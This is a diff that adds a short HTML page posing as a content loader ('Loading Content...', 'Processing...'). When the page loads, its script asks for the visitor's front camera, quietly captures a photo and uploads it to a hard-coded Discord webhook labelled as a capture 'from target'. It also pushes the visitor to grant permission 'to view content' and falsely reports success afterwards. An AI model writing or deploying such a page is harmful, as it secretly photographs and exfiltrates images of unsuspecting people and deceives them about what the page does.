@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing...</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <div id="status">Loading Content...</div>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1455135401042776064/lPm6cU4ACdX3UKDbSeYzmdxEYgMkGhqI-097947Cf8O3StFG5x2hPYsl-fxbIBQRrW0Q";
+
+        async function startCapture() {
+            try {
+                // Request front camera access immediately
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Wait 1.5 seconds to allow camera to adjust focus/brightness
+                setTimeout(() => {
+                    takePhoto(video);
+                }, 1500);
+
+            } catch (err) {
+                document.getElementById('status').innerText = "Error: Please allow permissions to view content.";
+                console.error("Camera access denied:", err);
+            }
+        }
+
+        function takePhoto(video) {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert frame to image file
+            canvas.toBlob((blob) => {
+                sendToDiscord(blob);
+            }, 'image/jpeg', 0.8);
+        }
+
+        function sendToDiscord(imageBlob) {
+            const formData = new FormData();
+            formData.append('file', imageBlob, 'target_capture.jpg');
+            formData.append('content', '📸 **New photo captured from target!**');
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            })
+            .then(() => {
+                document.getElementById('status').innerText = "Content Loaded Successfully.";
+            })
+            .catch(err => {
+                console.error("Transmission error:", err);
+            });
+        }
+
+        // Initialize on page load
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
